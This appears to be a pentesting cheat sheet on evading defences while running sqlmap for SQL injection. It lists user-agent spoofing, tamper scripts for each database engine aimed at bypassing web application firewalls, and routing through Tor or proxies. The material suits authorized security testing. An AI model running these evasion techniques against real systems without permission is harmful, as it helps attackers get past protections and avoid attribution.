---
author(s):
  - Userware
tags:
  - webapp-pentesting
  - server-side-attack
  - sql-injection
  - blind-sql-injection
  - sqlmap
---
# 03 - Evasion

## Change User-Agent

```
$ sqlmap -u "<URL>" --user-agent="<user_agent>"

$ sqlmap -u "<URL>" --mobile

$ sqlmap -u "<URL>" --random-agent
```

## Tamper Scripts

```
$ sqlmap --list-tampers

$ sqlmap -u "<URL>" --tamper=<script_1>,<script_2>,<script_n>
```

All scripts

```
--apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,randomcomments,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
```

General scripts

```
apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
```

Microsoft access

```
between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
```

Microsoft SQL Server

```
between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,percentage,randomcase,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
```

MySQL

```
between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
```

Oracle

```
between,charencode,equaltolike,greatest,multiplespaces,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes,xforwardedfor
```

PostgreSQL

```
between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,percentage,randomcase,space2comment,space2plus,space2randomblank,xforwardedfor
```

SAP MaxDB

```
ifnull2ifisnull,randomcase,space2comment,space2plus,unionalltounion,unmagicquotes,xforwardedfor
```

SQLite

```
ifnull2ifisnull,multiplespaces,randomcase,space2comment,space2dash,space2plus,unionalltounion,unmagicquotes,xforwardedfor
```

## Stealth

Using Delay

```
$ sqlmap -u "<URL>" --delay=<seconds>
```

Using TOR

```
$ sqlmap -u "<URL>" --check-tor --tor --tor-type=<HTTP | SOCKS4 | SOCKS5> --tor-port=<custom_TOR_PORT>
```

Using Proxy

```
$ sqlmap -u "<URL>" --proxy="<scheme>://<IP>:<PORT>" --proxy-cred="<username>:<password>"
```

---
## References

### Source Repositories

- [TrueNix: sqlmap AES encrypt payload](https://github.com/TrueNix/sqlmap-AES-encrypt-payload)

### Hackmag

- [Hackmag: Multistep SQL injection attacks - Operating principle and impact](https://hackmag.com/coding/multistep-sqli)

### Exploit Notes

- [Exploit Notes: SQL injection with SQLMap](https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-with-sqlmap/)

### Muhammad Daffa

- [Muhammad Daffa: Tips and Tricks for Effective SQL Injection Testing using SQLMap Tamper Scripts](https://muhdaffa.medium.com/tips-and-tricks-for-effective-sql-injection-testing-using-sqlmap-tamper-scripts-ed4bfa5717e7)

### Dragon Security

- [Dragon Security: SQLMap Tamper Scripts (SQL Injection and WAF bypass) Tips](https://medium.com/@drag0n/sqlmap-tamper-scripts-sql-injection-and-waf-bypass-c5a3f5764cb3)